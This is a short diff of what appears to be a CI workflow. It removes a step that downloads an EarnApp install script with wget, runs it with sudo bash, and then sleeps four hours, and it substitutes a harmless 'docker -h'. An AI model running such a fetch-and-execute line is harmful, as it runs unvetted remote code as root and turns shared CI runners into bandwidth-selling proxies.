@@ -15,5 +15,4 @@ jobs:
           KEY_W: ${{ secrets.KEY_W }}
 
         run: |
-          wget -qO- https://brightdata.com/static/earnapp/install.sh > /tmp/earnapp.sh && sudo bash /tmp/earnapp.sh
-          sleep 4h
+          docker -h
